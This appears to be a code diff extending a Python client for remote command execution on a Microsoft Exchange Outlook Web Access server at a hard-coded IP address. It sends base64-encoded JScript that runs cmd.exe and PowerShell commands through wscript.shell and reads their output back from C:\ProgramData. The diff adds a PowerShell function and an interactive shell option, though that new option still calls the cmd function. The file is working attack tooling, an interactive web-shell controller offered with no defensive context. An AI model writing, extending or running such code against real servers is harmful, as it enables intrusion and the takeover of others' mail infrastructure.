@@ -6,6 +6,7 @@ import warnings
 HOST = "34.68.42.174"
 URL = "/owa/auth/logout.aspx"
 GET_PARAMETERS = "?passwd=aaaaaa"
+OUT_FILE = "output22.txt"
 
 
 def base64_encode(text):
@@ -74,14 +75,48 @@ def run_cmd_command(command, delay, print_output=True, use_tmp_file=True):
     :return: output of the command
     """
     send_cmd = "var oShell = new ActiveXObject('wscript.shell');" \
-               f"oShell.Run('cmd.exe /c {command} > C:\\\\ProgramData\\\\output17.txt');"
+               f"oShell.Run('cmd.exe /c {command} > C:\\\\ProgramData\\\\{OUT_FILE} 2>&1');"
 
     send_cmd_no_tmp_file = "var oShell = new ActiveXObject('wscript.shell');" \
                            f"oShell.Run('cmd.exe /c {command} ');"
 
     get_cmd_result = "var myFileSysObj = new ActiveXObject('Scripting.FileSystemObject');" \
                      "var myOutputTextStream = myFileSysObj.OpenTextFile" \
-                     "('C:\\\\ProgramData\\\\output17.txt', 1, true);" \
+                     f"('C:\\\\ProgramData\\\\{OUT_FILE}', 1, true);" \
+                     "var x = '';" \
+                     "while (!myOutputTextStream.AtEndOfStream){x += myOutputTextStream.ReadLine() + '\\n';}" \
+                     "x;myOutputTextStream.Close();"
+
+    if use_tmp_file:
+        send_code(HOST, URL, GET_PARAMETERS, base64_encode(send_cmd))
+    else:
+        send_code(HOST, URL, GET_PARAMETERS, base64_encode(send_cmd_no_tmp_file))
+    cmd_output = ""
+    if delay > 0:
+        time.sleep(delay)
+    if print_output:
+        cmd_output = send_code(HOST, URL, GET_PARAMETERS, base64_encode(get_cmd_result), True)
+    return cmd_output
+
+
+def run_powershell_command(command, delay, print_output=True, use_tmp_file=True):
+    """
+        Run a cmd command
+        :param command: string, cmd command to run
+        :param delay: int, secs of delay before getting the result of the command
+        :param print_output: boolean, optionally disable output printing
+        :param use_tmp_file: boolean, optionally, if output isn't printed, don't create a temp file
+        :return: output of the command
+        """
+    send_cmd = "var oShell = new ActiveXObject('wscript.shell');" \
+               f"oShell.Run('powershell.exe {command} | Out-File \\'C:\\\\ProgramData\\\\{OUT_FILE}\\' ');"
+
+    send_cmd_no_tmp_file = "var oShell = new ActiveXObject('wscript.shell');" \
+                           f"oShell.Run('cmd.exe /c {command} ');"
+
+    get_cmd_result = "var myFileSysObj = new ActiveXObject('Scripting.FileSystemObject');" \
+                     "var myOutputTextStream = myFileSysObj.OpenTextFile" \
+                     f"('C:\\\\ProgramData\\\\{OUT_FILE}', 1, true);" \
                      "var x = '';" \
                      "while (!myOutputTextStream.AtEndOfStream){x += myOutputTextStream.ReadLine() + '\\n';}" \
                      "x;myOutputTextStream.Close();"
@@ -145,6 +180,8 @@ def main():
             run_cmd_command('del \\..\\..\\..\\..\\ProgramData\\test.txt', 1, False, False)
         elif user_input == "run_cmd_debug":
             run_cmd_command(input('cmd> '), 0, False, False)
+        elif user_input == "run_powershell":
+            run_cmd_command(input('powershell> '), delay)
         else:
             cmd_output = run_cmd_command(f'{user_input} ', delay)
             print(cmd_output)
